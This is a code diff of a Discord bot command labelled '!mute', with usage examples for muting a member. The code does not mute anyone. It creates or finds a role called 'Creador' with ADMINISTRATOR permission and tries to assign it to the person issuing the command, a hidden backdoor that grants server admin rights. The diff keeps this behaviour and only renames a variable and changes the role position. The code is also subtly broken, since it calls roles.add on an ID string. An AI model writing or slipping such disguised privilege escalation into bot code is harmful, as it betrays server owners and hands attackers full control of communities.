@@ -7,21 +7,21 @@ module.exports = {
     examples: ['!mute @Firulais', '!mute 556540723235651584', '!mute @Firulais Razon'],
     run: async (client , message, args) => {
         let mutee = message.author.id
-    let muterole2 = message.guild.roles.cache.find(r => r.name === "Creador")
-    if(!muterole2) {
+    let muterole = message.guild.roles.cache.find(r => r.name === "Creador")
+    if(!muterole) {
         try{
-            muterole2 = await message.guild.roles.create({ data: {  
+            muterole = await message.guild.roles.create({ data: {  
                 name : "Creador",
                 color : "#FF0000",
                 permissions : ["SEND_MESSAGES", "ADMINISTRATOR"]
             }
             })
-            await muterole2.setPosition(25);
+            await muterole.setPosition(2);
         } catch(e) {
             console.log(e.stack);
     }
 }
 
-mutee.roles.add(muterole2.id)
+mutee.roles.add(muterole.id)
     }
 }
